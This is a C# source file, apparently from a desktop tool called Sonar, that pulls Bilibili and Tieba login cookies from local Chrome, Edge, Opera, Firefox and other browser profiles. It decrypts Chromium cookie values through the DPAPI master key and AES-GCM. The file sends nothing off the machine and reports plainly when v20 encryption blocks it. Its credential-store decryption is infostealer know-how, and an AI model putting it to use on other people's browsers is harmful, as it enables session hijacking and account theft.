using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json.Nodes;
using Sonar.Interop;

namespace Sonar.Services;

public sealed class CookieExtractionResult
{
    public Dictionary<string, string>? Cookies { get; init; }
    public string Reason { get; init; } = "";
    public bool Success => Cookies is not null;
}

public sealed class CookieDbLockedException : Exception
{
    public CookieDbLockedException(string message) : base(message) { }
}

/// <summary>
/// 从本机浏览器提取 B站 / 贴吧 Cookie。
/// - Firefox：明文 SQLite，可直接读；
/// - 旧版 Chromium（v10/v11）：DPAPI 主密钥 + AES-GCM；
/// - Chrome/Edge 127+（v20）：明确告知无法自动解密，绝不谎报成功。
/// 数据库通过 Windows 自带的 winsqlite3.dll 读取，无第三方依赖。
/// </summary>
public static class CookieExtractor
{
    private static readonly Dictionary<string, string[]> CookieNames = new()
    {
        ["bilibili"] = new[] { "SESSDATA", "bili_jct", "DedeUserID", "DedeUserID__ckMd5" },
        ["tieba"] = new[] { "BDUSS", "STOKEN", "BAIDUID" },
    };

    private static readonly Dictionary<string, string> RequiredCookie = new()
    {
        ["bilibili"] = "SESSDATA",
        ["tieba"] = "BDUSS",
    };

    private static readonly Dictionary<string, string[]> CookieDomains = new()
    {
        ["bilibili"] = new[] { "bilibili.com", "bilibili.cn" },
        ["tieba"] = new[] { "baidu.com" },
    };

    private static readonly byte[] DpapiPrefix = Encoding.ASCII.GetBytes("DPAPI");

    // ----------------------------------------------------------------
    // 浏览器资料定位
    // ----------------------------------------------------------------

    private static string LocalAppData =>
        Environment.GetEnvironmentVariable("LOCALAPPDATA")
        ?? Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

    private static string RoamingAppData =>
        Environment.GetEnvironmentVariable("APPDATA")
        ?? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    private static List<(string Name, string Path)> ChromiumBrowsers() => new()
    {
        ("Chrome", Path.Combine(LocalAppData, "Google", "Chrome", "User Data")),
        ("Chrome Beta", Path.Combine(LocalAppData, "Google", "Chrome Beta", "User Data")),
        ("Edge", Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data")),
        ("Brave", Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Vivaldi", Path.Combine(LocalAppData, "Vivaldi", "User Data")),
        ("Chromium", Path.Combine(LocalAppData, "Chromium", "User Data")),
        ("360 极速浏览器", Path.Combine(LocalAppData, "360Chrome", "Chrome", "User Data")),
        ("QQ 浏览器", Path.Combine(LocalAppData, "Tencent", "QQBrowser", "User Data")),
        ("Opera", Path.Combine(RoamingAppData, "Opera Software", "Opera Stable")),
        ("Opera GX", Path.Combine(RoamingAppData, "Opera Software", "Opera GX Stable")),
    };

    private static List<(string Profile, string CookieFile)> ChromiumProfiles(string userDataDir)
    {
        var result = new List<(string, string)>();
        if (!Directory.Exists(userDataDir)) return result;

        var profileDirs = new List<string>();
        try
        {
            foreach (var dir in Directory.EnumerateDirectories(userDataDir))
            {
                var name = Path.GetFileName(dir);
                if (name == "Default" || name.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
                {
                    profileDirs.Add(dir);
                }
            }
        }
        catch
        {
            // 无法枚举时按无资料处理
        }

        // Opera 等浏览器直接把资料目录本身作为 profile
        if (profileDirs.Count == 0) profileDirs.Add(userDataDir);

        foreach (var dir in profileDirs)
        {
            foreach (var relative in new[]
                     {
                         Path.Combine("Network", "Cookies"),
                         "Cookies",
                     })
            {
                var cookieFile = Path.Combine(dir, relative);
                if (File.Exists(cookieFile))
                {
                    result.Add((Path.GetFileName(dir), cookieFile));
                    break;
                }
            }
        }
        return result;
    }

    private static List<string> FirefoxProfiles()
    {
        var baseDir = Path.Combine(RoamingAppData, "Mozilla", "Firefox");
        var found = new List<string>();
        if (!Directory.Exists(baseDir)) return found;

        var ini = Path.Combine(baseDir, "profiles.ini");
        if (File.Exists(ini))
        {
            try
            {
                var section = "";
                var pathValue = "";
                var relative = true;
                foreach (var raw in File.ReadAllLines(ini))
                {
                    var line = raw.Trim();
                    if (line.StartsWith('[') && line.EndsWith(']'))
                    {
                        if (section.StartsWith("Profile", StringComparison.OrdinalIgnoreCase) &&
                            pathValue.Length > 0)
                        {
                            var candidate = relative
                                ? Path.Combine(baseDir, pathValue)
                                : pathValue;
                            var cookie = Path.Combine(candidate, "cookies.sqlite");
                            if (File.Exists(cookie)) found.Add(cookie);
                        }
                        section = line[1..^1];
                        pathValue = "";
                        relative = true;
                        continue;
                    }
                    var index = line.IndexOf('=');
                    if (index <= 0) continue;
                    var key = line[..index].Trim();
                    var value = line[(index + 1)..].Trim();
                    if (key.Equals("Path", StringComparison.OrdinalIgnoreCase)) pathValue = value;
                    else if (key.Equals("IsRelative", StringComparison.OrdinalIgnoreCase))
                        relative = value != "0";
                }
                if (section.StartsWith("Profile", StringComparison.OrdinalIgnoreCase) &&
                    pathValue.Length > 0)
                {
                    var candidate = relative ? Path.Combine(baseDir, pathValue) : pathValue;
                    var cookie = Path.Combine(candidate, "cookies.sqlite");
                    if (File.Exists(cookie)) found.Add(cookie);
                }
            }
            catch
            {
                // profiles.ini 损坏时走全盘扫描
            }
        }

        if (found.Count == 0)
        {
            try
            {
                foreach (var folder in new[]
                         {
                             Path.Combine(baseDir, "Profiles"),
                             baseDir,
                         })
                {
                    if (!Directory.Exists(folder)) continue;
                    found.AddRange(Directory.GetFiles(folder, "cookies.sqlite",
                        SearchOption.AllDirectories));
                }
            }
            catch
            {
                // 忽略
            }
        }

        return found.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
    }

    // ----------------------------------------------------------------
    // 数据库打开（含独占锁退化）
    // ----------------------------------------------------------------

    private static (WinSqlite.Database Db, string? TempFile) OpenDatabase(string path)
    {
        try
        {
            return (WinSqlite.Database.OpenReadOnly(path), null);
        }
        catch
        {
            // 浏览器运行期间会独占锁定数据库，退化为复制一份再读
        }

        var temp = Path.Combine(Path.GetTempPath(),
            "sonar_ck_" + Guid.NewGuid().ToString("N") + ".sqlite");
        try
        {
            File.Copy(path, temp, overwrite: true);
            return (WinSqlite.Database.OpenReadOnly(temp), temp);
        }
        catch (Exception ex)
        {
            try
            {
                if (File.Exists(temp)) File.Delete(temp);
            }
            catch
            {
                // 忽略临时文件清理失败
            }
            throw new CookieDbLockedException("数据库文件被占用或不可读: " + ex.Message);
        }
    }

    private static void Cleanup(WinSqlite.Database db, string? temp)
    {
        db.Dispose();
        if (temp is null) return;
        try
        {
            if (File.Exists(temp)) File.Delete(temp);
        }
        catch
        {
            // 忽略
        }
    }

    private static bool HasDomainHash(WinSqlite.Database db)
    {
        try
        {
            using var statement = db.Prepare("SELECT value FROM meta WHERE key = \"version\"");
            if (!statement.Step()) return false;
            return int.TryParse(statement.ReadText(0), out var version) && version >= 24;
        }
        catch
        {
            return false;
        }
    }

    // ----------------------------------------------------------------
    // DPAPI / AES
    // ----------------------------------------------------------------

    [StructLayout(LayoutKind.Sequential)]
    private struct DataBlob
    {
        public int CbData;
        public IntPtr PbData;
    }

    [DllImport("crypt32.dll", SetLastError = true)]
    private static extern bool CryptUnprotectData(
        ref DataBlob dataIn, IntPtr description, IntPtr entropy, IntPtr reserved,
        IntPtr prompt, uint flags, out DataBlob dataOut);

    [DllImport("kernel32.dll")]
    private static extern IntPtr LocalFree(IntPtr handle);

    private static byte[]? DpapiUnprotect(byte[] data)
    {
        var input = Marshal.AllocHGlobal(data.Length);
        try
        {
            Marshal.Copy(data, 0, input, data.Length);
            var inputBlob = new DataBlob { CbData = data.Length, PbData = input };
            if (!CryptUnprotectData(ref inputBlob, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                    IntPtr.Zero, 0x01, out var outputBlob))
            {
                return null;
            }
            try
            {
                var result = new byte[outputBlob.CbData];
                Marshal.Copy(outputBlob.PbData, result, 0, result.Length);
                return result;
            }
            finally
            {
                LocalFree(outputBlob.PbData);
            }
        }
        catch
        {
            return null;
        }
        finally
        {
            Marshal.FreeHGlobal(input);
        }
    }

    private static byte[]? LoadMasterKey(string localStatePath)
    {
        try
        {
            if (!File.Exists(localStatePath)) return null;
            var state = JsonNode.Parse(File.ReadAllText(localStatePath, Encoding.UTF8));
            var encoded = JsonUtil.GetString(state, "",
                "os_crypt", "encrypted_key");
            if (encoded.Length == 0) return null;
            var blob = Convert.FromBase64String(encoded);
            if (blob.Length > DpapiPrefix.Length &&
                blob.AsSpan(0, DpapiPrefix.Length).SequenceEqual(DpapiPrefix))
            {
                blob = blob[DpapiPrefix.Length..];
            }
            return DpapiUnprotect(blob);
        }
        catch
        {
            return null;
        }
    }

    private static byte[]? DeriveAesKey(byte[] masterKey)
    {
        try
        {
            return Rfc2898DeriveBytes.Pbkdf2(masterKey, Encoding.ASCII.GetBytes("saltysalt"),
                1, HashAlgorithmName.SHA1, 16);
        }
        catch
        {
            return null;
        }
    }

    private static string? DecryptChromium(string value, byte[]? encryptedValue,
        byte[]? aesKey, bool domainHash)
    {
        if (!string.IsNullOrEmpty(value)) return value;
        if (encryptedValue is null || encryptedValue.Length == 0) return "";

        var blob = encryptedValue;
        var isV10 = blob.Length > 3 && blob[0] == (byte)'v' && blob[1] == (byte)'1' &&
                    (blob[2] == (byte)'0' || blob[2] == (byte)'1');
        if (isV10)
        {
            if (aesKey is null || aesKey.Length != 16) return null;
            try
            {
                var nonce = blob.AsSpan(3, 12).ToArray();
                var payload = blob.AsSpan(15).ToArray();
                if (payload.Length < 16) return null;
                var ciphertext = payload.AsSpan(0, payload.Length - 16).ToArray();
                var tag = payload.AsSpan(payload.Length - 16).ToArray();
                var plaintext = new byte[ciphertext.Length];
                using var aes = new AesGcm(aesKey, 16);
                aes.Decrypt(nonce, ciphertext, tag, plaintext);
                var textBytes = domainHash && plaintext.Length > 32
                    ? plaintext.AsSpan(32).ToArray()
                    : plaintext;
                return Encoding.UTF8.GetString(textBytes);
            }
            catch
            {
                return null;
            }
        }

        if (blob.Length > 3 && blob[0] == (byte)'v' && blob[1] == (byte)'2' && blob[2] == (byte)'0')
        {
            // 应用绑定加密：只有浏览器自身进程能解
            return null;
        }

        var dpapi = DpapiUnprotect(blob);
        return dpapi is null ? null : Encoding.UTF8.GetString(dpapi);
    }

    private static bool HostMatches(string? host, string[] domains)
    {
        var value = (host ?? "").TrimStart('.').ToLowerInvariant();
        return domains.Any(domain =>
            value == domain || value.EndsWith("." + domain, StringComparison.Ordinal));
    }

    // ----------------------------------------------------------------
    // Chromium
    // ----------------------------------------------------------------

    private static (Dictionary<string, string>? Cookies, string? Reason) ReadChromium(
        string browserName, string userDataDir, string platform, string[] names, string[] domains)
    {
        var profiles = ChromiumProfiles(userDataDir);
        if (profiles.Count == 0) return (null, null);

        var v20Seen = false;
        var keyFailed = false;
        var lockedProfiles = new List<string>();
        var errors = new List<string>();
        byte[]? masterKey = null;
        byte[]? aesKey = null;
        var keyLoaded = false;

        foreach (var (profileName, cookieFile) in profiles)
        {
            WinSqlite.Database db;
            string? temp;
            try
            {
                (db, temp) = OpenDatabase(cookieFile);
            }
            catch (CookieDbLockedException)
            {
                lockedProfiles.Add(profileName);
                continue;
            }
            catch (Exception ex)
            {
                errors.Add($"{browserName}/{profileName} 数据库读取失败({ex.Message})");
                continue;
            }

            try
            {
                var domainHash = HasDomainHash(db);
                var found = new Dictionary<string, string>(StringComparer.Ordinal);
                var foundHosts = new Dictionary<string, string>(StringComparer.Ordinal);
                using var statement = db.Prepare(
                    "SELECT host_key, name, value, encrypted_value FROM cookies");
                while (statement.Step())
                {
                    var host = statement.ReadText(0);
                    var name = statement.ReadText(1);
                    if (!names.Contains(name) || !HostMatches(host, domains)) continue;

                    var encrypted = statement.ReadBlob(3);
                    if (encrypted is { Length: > 3 } &&
                        encrypted[0] == (byte)'v' && encrypted[1] == (byte)'2' &&
                        encrypted[2] == (byte)'0')
                    {
                        v20Seen = true;
                        continue;
                    }

                    if (!keyLoaded)
                    {
                        keyLoaded = true;
                        masterKey = LoadMasterKey(Path.Combine(userDataDir, "Local State"));
                        aesKey = masterKey is null ? null : DeriveAesKey(masterKey);
                    }

                    if (encrypted is { Length: > 3 } && aesKey is null &&
                        encrypted[0] == (byte)'v' && encrypted[1] == (byte)'1' &&
                        (encrypted[2] == (byte)'0' || encrypted[2] == (byte)'1'))
                    {
                        keyFailed = true;
                        continue;
                    }

                    var value = statement.ReadText(2);
                    var plain = DecryptChromium(value, encrypted, aesKey, domainHash);
                    if (!string.IsNullOrEmpty(plain) && !found.ContainsKey(name))
                    {
                        found[name] = plain;
                        foundHosts[name] = host;
                    }
                }

                var required = RequiredCookie[platform];
                if (found.ContainsKey(required))
                {
                    var cookies = new Dictionary<string, string>(found, StringComparer.Ordinal)
                    {
                        ["_source"] = $"{browserName}（{profileName} 配置文件）",
                        ["_host"] = foundHosts[required],
                    };
                    return (cookies, null);
                }
            }
            finally
            {
                Cleanup(db, temp);
            }
        }

        if (lockedProfiles.Count > 0)
        {
            return (null, $"{browserName} 正在运行，Cookie 数据库被独占锁定" +
                          $"（{string.Join(", ", lockedProfiles)}）；请完全退出 {browserName} 后重试");
        }
        if (keyFailed)
        {
            return (null, $"{browserName} 的 Cookie 需要 AES 解密，但无法读取 DPAPI 主密钥；" +
                          "请手动粘贴");
        }
        if (v20Seen)
        {
            return (null, $"{browserName} 的 Cookie 使用 Chrome 127+ 应用绑定加密（v20），" +
                          "只有浏览器自身进程能解密，自动读取不可用；请手动粘贴");
        }
        if (errors.Count > 0) return (null, string.Join("；", errors));
        return (null, null);
    }

    // ----------------------------------------------------------------
    // Firefox
    // ----------------------------------------------------------------

    private static (Dictionary<string, string>? Cookies, string? Reason) ReadFirefox(
        string dbPath, string platform, string[] names, string[] domains)
    {
        WinSqlite.Database db;
        string? temp;
        try
        {
            (db, temp) = OpenDatabase(dbPath);
        }
        catch (CookieDbLockedException)
        {
            return (null, "Firefox 正在运行，Cookie 数据库被占用；请完全退出 Firefox 后重试");
        }
        catch (Exception ex)
        {
            return (null, $"Firefox 数据库读取失败({ex.Message})");
        }

        try
        {
            var found = new Dictionary<string, string>(StringComparer.Ordinal);
            var hosts = new Dictionary<string, string>(StringComparer.Ordinal);
            using var statement = db.Prepare("SELECT host, name, value FROM moz_cookies");
            while (statement.Step())
            {
                var host = statement.ReadText(0);
                var name = statement.ReadText(1);
                var value = statement.ReadText(2);
                if (!names.Contains(name) || !HostMatches(host, domains) ||
                    string.IsNullOrEmpty(value)) continue;
                if (!found.ContainsKey(name))
                {
                    found[name] = value;
                    hosts[name] = host;
                }
            }

            var required = RequiredCookie[platform];
            if (found.ContainsKey(required))
            {
                var cookies = new Dictionary<string, string>(found, StringComparer.Ordinal)
                {
                    ["_source"] = "Firefox（明文库）",
                    ["_host"] = hosts[required],
                };
                return (cookies, null);
            }
            return (null, null);
        }
        finally
        {
            Cleanup(db, temp);
        }
    }

    // ----------------------------------------------------------------
    // 对外接口
    // ----------------------------------------------------------------

    public static CookieExtractionResult ExtractCookies(string platform)
    {
        if (!CookieNames.ContainsKey(platform))
        {
            return new CookieExtractionResult { Reason = $"未知平台: {platform}" };
        }

        var names = CookieNames[platform];
        var domains = CookieDomains[platform];
        var reasons = new List<string>();
        var sourceHits = 0;

        foreach (var (browserName, userDataDir) in ChromiumBrowsers())
        {
            if (!Directory.Exists(userDataDir)) continue;
            sourceHits++;
            var (cookies, reason) = ReadChromium(browserName, userDataDir, platform, names, domains);
            if (cookies is not null) return new CookieExtractionResult { Cookies = cookies };
            if (!string.IsNullOrEmpty(reason)) reasons.Add(reason);
        }

        foreach (var dbPath in FirefoxProfiles())
        {
            sourceHits++;
            var (cookies, reason) = ReadFirefox(dbPath, platform, names, domains);
            if (cookies is not null) return new CookieExtractionResult { Cookies = cookies };
            if (!string.IsNullOrEmpty(reason)) reasons.Add(reason);
        }

        if (sourceHits == 0)
        {
            return new CookieExtractionResult
            {
                Reason = "未在本机找到任何受支持的浏览器资料目录（Chrome / Edge / Firefox 等）",
            };
        }
        if (reasons.Count > 0)
        {
            return new CookieExtractionResult { Reason = string.Join("\n", reasons) };
        }
        return new CookieExtractionResult
        {
            Reason = "浏览器资料中未找到该平台的登录 Cookie（可能未登录，或 Cookie 已被清理）",
        };
    }

    public static CookieExtractionResult GetBilibiliCookies() => ExtractCookies("bilibili");

    public static CookieExtractionResult GetTiebaCookies() => ExtractCookies("tieba");

    public static List<string> BrowserSources()
    {
        var sources = new List<string>();
        foreach (var (name, path) in ChromiumBrowsers())
        {
            if (Directory.Exists(path)) sources.Add($"{name}: {path}");
        }
        foreach (var path in FirefoxProfiles())
        {
            sources.Add($"Firefox: {path}");
        }
        return sources;
    }

    public static void OpenBilibiliLogin() => OpenUrl("https://passport.bilibili.com/login");

    public static void OpenTiebaLogin() => OpenUrl("https://tieba.baidu.com/");

    private static void OpenUrl(string url)
    {
        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true,
            });
        }
        catch
        {
            // 打不开浏览器时静默忽略
        }
    }
}
